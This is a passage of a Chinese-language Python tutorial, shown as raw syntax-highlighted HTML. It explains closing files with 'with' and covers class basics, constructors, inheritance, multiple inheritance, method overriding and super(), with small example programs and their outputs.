punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>以上这段代码的问题是，当执行完毕后，文件会保持打开状态，并没有被关闭</p>\n<p>关键词 with 语句就可以保证诸如文件之类的对象在使用完之后一定会正确的执行他的清理方法</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"myfile.txt\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>以上这段代码执行完毕后，就算在处理过程中出问题了，文件 f 总是会关闭</p>\n<h2 id=\"面向对象\"><a href=\"#面向对象\" class=\"headerlink\" title=\"面向对象\"></a>面向对象</h2><h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><ul>\n<li><strong>类(Class):</strong> 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。</li>\n<li><strong>方法：</strong>类中定义的函数。</li>\n<li><strong>类变量：</strong>类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。</li>\n<li><strong>数据成员：</strong>类变量或者实例变量用于处理类及其实例对象的相关的数据。</li>\n<li><strong>方法重写：</strong>如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。</li>\n<li><strong>局部变量：</strong>定义在方法中的变量，只作用于当前实例的类。</li>\n<li><strong>实例变量：</strong>在类的声明中，属性是用变量来表示的，这种变量就称为实例变量，实例变量就是一个用 self 修饰的变量。</li>\n<li><strong>继承：</strong>即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。</li>\n<li><strong>实例化：</strong>创建一个类的实例，类的具体对象。</li>\n<li><strong>对象：</strong>通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。</li>\n</ul>\n<h3 id=\"类定义\"><a href=\"#类定义\" class=\"headerlink\" title=\"类定义\"></a>类定义</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">ClassName</span><span class=\"token punctuation\">:</span>\n    <span class=\"token operator\">&lt;</span>statement<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token punctuation\">.</span>\n    <span class=\"token punctuation\">.</span>\n    <span class=\"token punctuation\">.</span>\n    <span class=\"token operator\">&lt;</span>statement<span class=\"token operator\">-</span>N<span class=\"token operator\">&gt;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"类对象\"><a href=\"#类对象\" class=\"headerlink\" title=\"类对象\"></a>类对象</h3><ol>\n<li>类对象支持属性引用和实例化</li>\n<li>属性引用格式 obj.name</li>\n<li>类对象创建后，类命名空间中所有的命名都是有效属性名</li>\n<li>类有一个名为 _<em>init</em>_() 的特殊方法（<strong>构造方法</strong>），该方法在类实例化时会自动调用</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">MyClass</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\"一个简单的类实例\"\"\"</span>\n    i <span class=\"token operator\">=</span> <span class=\"token number\">12345</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">'hello world'</span>\n \n<span class=\"token comment\"># 实例化类</span>\nx <span class=\"token operator\">=</span> MyClass<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n \n<span class=\"token comment\"># 访问类的属性和方法</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"MyClass 类的属性 i 为：\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">.</span>i<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"MyClass 类的方法 f 输出为：\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">.</span>f<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\nMyClass 类的属性 i 为： 12345\nMyClass 类的方法 f 输出为： hello world\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Complex</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> realpart<span class=\"token punctuation\">,</span> imagpart<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>r <span class=\"token operator\">=</span> realpart\n        self<span class=\"token punctuation\">.</span>i <span class=\"token operator\">=</span> imagpart\nx <span class=\"token operator\">=</span> Complex<span class=\"token punctuation\">(</span><span class=\"token number\">3.0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">4.5</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">.</span>r<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">.</span>i<span class=\"token punctuation\">)</span>   <span class=\"token comment\"># 输出结果：3.0 -4.5</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>self代表类的实例，而非类</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">prt</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">)</span>\n \nt <span class=\"token operator\">=</span> Test<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nt<span class=\"token punctuation\">.</span>prt<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n&lt;__main__.Test object at 0x000001A9BBFF6A60&gt;\n&lt;class '__main__.Test'&gt;\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>self不是关键字，换成其他的也行</p>\n<h3 id=\"类的方法\"><a href=\"#类的方法\" class=\"headerlink\" title=\"类的方法\"></a>类的方法</h3><ol>\n<li>使用def关键字来定义一个方法</li>\n<li>必须包含参数self并且为第一个</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#类定义</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">people</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\">#定义基本属性</span>\n    name <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    age <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token comment\">#定义私有属性,私有属性在类外部无法直接进行访问</span>\n    __weight <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token comment\">#定义构造方法</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>w<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> n\n        self<span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> a\n        self<span class=\"token punctuation\">.</span>__weight <span class=\"token operator\">=</span> w\n    <span class=\"token keyword\">def</span> <span class=\"token function\">speak</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s 说: 我 %d 岁。\"</span> <span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span>self<span class=\"token punctuation\">.</span>age<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n \n<span class=\"token comment\"># 实例化类</span>\np <span class=\"token operator\">=</span> people<span class=\"token punctuation\">(</span><span class=\"token string\">'runoob'</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>speak<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\nrunoob 说: 我 10 岁。\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"继承\"><a href=\"#继承\" class=\"headerlink\" title=\"继承\"></a>继承</h3><p>子类（派生类 DerivedClassName）会继承父类（基类 BaseClassName）的属性和方法</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">DerivedClassName</span><span class=\"token punctuation\">(</span>BaseClassName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token operator\">&lt;</span>statement<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token punctuation\">.</span>\n    <span class=\"token punctuation\">.</span>\n    <span class=\"token punctuation\">.</span>\n    <span class=\"token operator\">&lt;</span>statement<span class=\"token operator\">-</span>N<span class=\"token operator\">&gt;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>基类定义在另一个模块中时</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">DerivedClassName</span><span class=\"token punctuation\">(</span>modname<span class=\"token punctuation\">.</span>BaseClassName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#类定义</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">people</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\">#定义基本属性</span>\n    name <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    age <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token comment\">#定义私有属性,私有属性在类外部无法直接进行访问</span>\n    __weight <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token comment\">#定义构造方法</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>w<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> n\n        self<span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> a\n        self<span class=\"token punctuation\">.</span>__weight <span class=\"token operator\">=</span> w\n    <span class=\"token keyword\">def</span> <span class=\"token function\">speak</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s 说: 我 %d 岁。\"</span> <span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span>self<span class=\"token punctuation\">.</span>age<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n \n<span class=\"token comment\">#单继承示例</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">student</span><span class=\"token punctuation\">(</span>people<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    grade <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>w<span class=\"token punctuation\">,</span>g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\">#调用父类的构函</span>\n        people<span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>w<span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>grade <span class=\"token operator\">=</span> g\n    <span class=\"token comment\">#覆写父类的方法</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">speak</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s 说: 我 %d 岁了，我在读 %d 年级\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span>self<span class=\"token punctuation\">.</span>age<span class=\"token punctuation\">,</span>self<span class=\"token punctuation\">.</span>grade<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n \n \n \ns <span class=\"token operator\">=</span> student<span class=\"token punctuation\">(</span><span class=\"token string\">'ken'</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">60</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\ns<span class=\"token punctuation\">.</span>speak<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\nken 说: 我 10 岁了，我在读 3 年级\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>继承时可以直接调用父类构造函数，再添加新的变量</li>\n<li>父类的方法也能直接调用或者重写</li>\n<li>子类不重写 **_<em>init</em><em>**，实例化子类时，会自动调用父类定义的 **_<em>init</em></em>**</li>\n</ol>\n<h3 id=\"多继承\"><a href=\"#多继承\" class=\"headerlink\" title=\"多继承\"></a>多继承</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">DerivedClassName</span><span class=\"token punctuation\">(</span>Base1<span class=\"token punctuation\">,</span> Base2<span class=\"token punctuation\">,</span> Base3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token operator\">&lt;</span>statement<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token punctuation\">.</span>\n    <span class=\"token punctuation\">.</span>\n    <span class=\"token punctuation\">.</span>\n    <span class=\"token operator\">&lt;</span>statement<span class=\"token operator\">-</span>N<span class=\"token operator\">&gt;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>若是父类中有相同的方法名，而在子类使用时未指定，python从左至右搜索 即方法在子类中未找到时，从左到右查找父类中是否包含方法</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#类定义</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">people</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\">#定义基本属性</span>\n    name <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    age <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token comment\">#定义私有属性,私有属性在类外部无法直接进行访问</span>\n    __weight <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token comment\">#定义构造方法</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>w<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> n\n        self<span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> a\n        self<span class=\"token punctuation\">.</span>__weight <span class=\"token operator\">=</span> w\n    <span class=\"token keyword\">def</span> <span class=\"token function\">speak</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s 说: 我 %d 岁。\"</span> <span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span>self<span class=\"token punctuation\">.</span>age<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n \n<span class=\"token comment\">#单继承示例</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">student</span><span class=\"token punctuation\">(</span>people<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    grade <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>w<span class=\"token punctuation\">,</span>g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\">#调用父类的构函</span>\n        people<span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>w<span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>grade <span class=\"token operator\">=</span> g\n    <span class=\"token comment\">#覆写父类的方法</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">speak</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s 说: 我 %d 岁了，我在读 %d 年级\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span>self<span class=\"token punctuation\">.</span>age<span class=\"token punctuation\">,</span>self<span class=\"token punctuation\">.</span>grade<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n \n<span class=\"token comment\">#另一个类，多重继承之前的准备</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">speaker</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    topic <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    name <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> n\n        self<span class=\"token punctuation\">.</span>topic <span class=\"token operator\">=</span> t\n    <span class=\"token keyword\">def</span> <span class=\"token function\">speak</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"我叫 %s，我是一个演说家，我演讲的主题是 %s\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span>self<span class=\"token punctuation\">.</span>topic<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n \n<span class=\"token comment\">#多重继承</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">sample</span><span class=\"token punctuation\">(</span>speaker<span class=\"token punctuation\">,</span>student<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    a <span class=\"token operator\">=</span><span class=\"token string\">''</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>w<span class=\"token punctuation\">,</span>g<span class=\"token punctuation\">,</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        student<span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>w<span class=\"token punctuation\">,</span>g<span class=\"token punctuation\">)</span>\n        speaker<span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>t<span class=\"token punctuation\">)</span>\n \ntest <span class=\"token operator\">=</span> sample<span class=\"token punctuation\">(</span><span class=\"token string\">\"Tim\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">25</span><span class=\"token punctuation\">,</span><span class=\"token number\">80</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"Python\"</span><span class=\"token punctuation\">)</span>\ntest<span class=\"token punctuation\">.</span>speak<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">#方法名同，默认调用的是在括号中排前地父类的方法</span>\n\n<span class=\"token triple-quoted-string string\">'''\n我叫 Tim，我是一个演说家，我演讲的主题是 Python\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"方法重写\"><a href=\"#方法重写\" class=\"headerlink\" title=\"方法重写\"></a>方法重写</h3><p>super() 函数是用于调用父类(超类)的一个方法</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Parent</span><span class=\"token punctuation\">:</span>        <span class=\"token comment\"># 定义父类</span>\n   <span class=\"token keyword\">def</span> <span class=\"token function\">myMethod</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n      <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'调用父类方法'</span><span class=\"token punctuation\">)</span>\n \n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Child</span><span class=\"token punctuation\">(</span>Parent<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 定义子类</span>\n   <span class=\"token keyword\">def</span> <span class=\"token function\">myMethod</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n      <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'调用子类方法'</span><span class=\"token punctuation\">)</span>\n \nc <span class=\"token operator\">=</span> Child<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>          <span class=\"token comment\"># 子类实例</span>\nc<span class=\"token punctuation\">.</span>myMethod<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>         <span class=\"token comment\"># 子类调用重写方法</span>\n<span class=\"token builtin\">super</span><span class=\"token punctuation\">(</span>Child<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>myMethod<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#用子类对象调用父类已被覆盖的方法</span>\n\n<span class=\"token triple-quoted-string string\">'''\n调用子类方法\n调用父类方法\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"子类继承父类构造函数说明\"><a href=\"#子类继承父类构造函数说明\" class=\"headerlink\" title=\"子类继承父类构造函数说明\"></a>子类继承父类构造函数说明</h3><p>子类不重写 **_<em>init</em><em>**，实例化子类时，会自动调用父类定义的 **_<em>init</em></em>**</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Father</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>name<span class=\"token operator\">=</span>name\n        <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span> <span class=\"token string\">\"name: %s\"</span> <span class=\"token operator\">%</span><span class=\"token punctuation\">(</span> self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">'Father '</span> <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>name\n \n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Son</span><span class=\"token punctuation\">(</span>Father<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">'Son '</span><span class=\"token operator\">+</span>self<span class=\"token punctuation\">.</span>name\n \n<span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    son<span class=\"token operator\">=</span>Son<span class=\"token punctuation\">(</span><span class=\"token string\">'runoob'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span> son<span class=\"token punctuation\">.</span>getName<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    \n<span class=\"token triple-quoted-string string\">'''\nname: runoob\nSon runoob\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>如果重写了<strong>_<em>init</em>_</strong> 时，实例化子类，就不会调用父类已经定义的 <strong>_<em>init</em>_</strong></p>\n<p>如果重写了<strong>_<em>init</em>_</strong> 时，要继承父类的构造方法，可以使用 <strong>super</strong> 关键字</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">super</span><span class=\"token punctuation\">(</span>子类，self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span>参数<span class=\"token number\">1</span>，参数<span class=\"token number\">2</span>，<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>还有一种经典写法</p>\n<pre class=\"line-numbers 